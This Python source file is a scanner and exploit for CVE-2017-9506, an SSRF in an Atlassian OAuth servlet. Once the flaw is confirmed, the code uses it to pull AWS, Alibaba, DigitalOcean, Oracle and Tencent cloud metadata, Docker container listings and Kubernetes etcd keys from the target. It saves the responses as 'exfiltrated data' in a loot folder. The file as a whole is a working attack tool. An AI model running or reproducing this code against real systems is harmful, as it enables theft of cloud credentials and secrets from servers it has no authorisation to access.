import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
from urllib.parse import urlparse
import urllib3

def check_cve_2017_9506(base_url, output_folder="loot/"):
    """
    Checks for CVE-2017-9506 (SSRF via OAuth endpoint) and extracts sensitive metadata if applicable.
    """
    print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2017-9506 (SSRF){Style.RESET_ALL}")
    
    vulnerabilities = ''  # String to store discovered vulnerabilities
    try:
        # Test SSRF with a simple payload
        test_url = "https://google.com"
        check_url = f"{base_url.rstrip('/')}/plugins/servlet/oauth/users/icon-uri?consumerUri={test_url}"
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_url}")
        response = requests.get(check_url, allow_redirects=False, verify=False)

        # Check if the SSRF is successful
        if response.status_code == 200 and "googlelogo" in response.text:
            vulnerability_detail = f"+ [SSRF] Vulnerable to CVE-2017-9506 (SSRF): {check_url}"
            vulnerabilities += vulnerability_detail
            print(f"{Fore.RED}[!!] [SSRF] Vulnerable to CVE-2017-9506 (SSRF): {check_url}{Style.RESET_ALL}")

            # Perform metadata exfiltration checks
            sensitive_urls = {
                "AWS Metadata": "http://169.254.169.254/latest/meta-data/",
                "Alibaba Metadata": "http://100.100.100.200/latest/meta-data/",
                "Docker Containers": "http://127.0.0.1:2375/v1.24/containers/json",
                "Kubernetes ETCD API keys": "http://127.0.0.1:2379/v2/keys/?recursive=true",
                "Digital Ocean Metadata":"http://169.254.169.254/metadata/v1.json",
                "Oracle Cloud":"http://192.0.0.192/latest/user-data/",
                "Tencent Cloud":"http://metadata.tencentyun.com/latest/meta-data/",
            }

            exfiltrated_data = {}

            for label, sensitive_url in sensitive_urls.items():
                print(f"\tChecking {label}")
                sensitive_check_url = f"{base_url.rstrip('/')}/plugins/servlet/oauth/users/icon-uri?consumerUri={sensitive_url}"
                sensitive_response = requests.get(sensitive_check_url, allow_redirects=False, verify=False)

                if sensitive_response.status_code == 200:
                    print(f"\t----> {label} Found: {sensitive_check_url}")
                    vulnerabilities += f"\n[+] [SSRF] Vulnerable to CVE-2017-9506: {label} Found: {sensitive_check_url}"
                    exfiltrated_data[label] = sensitive_response.text
                else:
                    print(f"\t----> {label} Not Found")
                    print(f"{Fore.YELLOW}\t----> HTTP Code: {sensitive_response.status_code}{Style.RESET_ALL}")

            # Write exfiltrated data to file if applicable
            if exfiltrated_data and output_folder:
                filename = f"CVE-2017-9506_{urlparse(base_url).netloc}.txt"
                filepath = f"{output_folder.rstrip('/')}/{filename}"
                with open(filepath, 'w') as outfile:
                    for label, data in exfiltrated_data.items():
                        outfile.write(f"---- {label} ----\n")
                        outfile.write(data + "\n")
                print(f"\n{Fore.GREEN}Exfiltrated data written to: {filepath}{Style.RESET_ALL}")

        else:
            print(f"{Fore.YELLOW}- Not Vulnerable to CVE-2017-9506{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {base_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
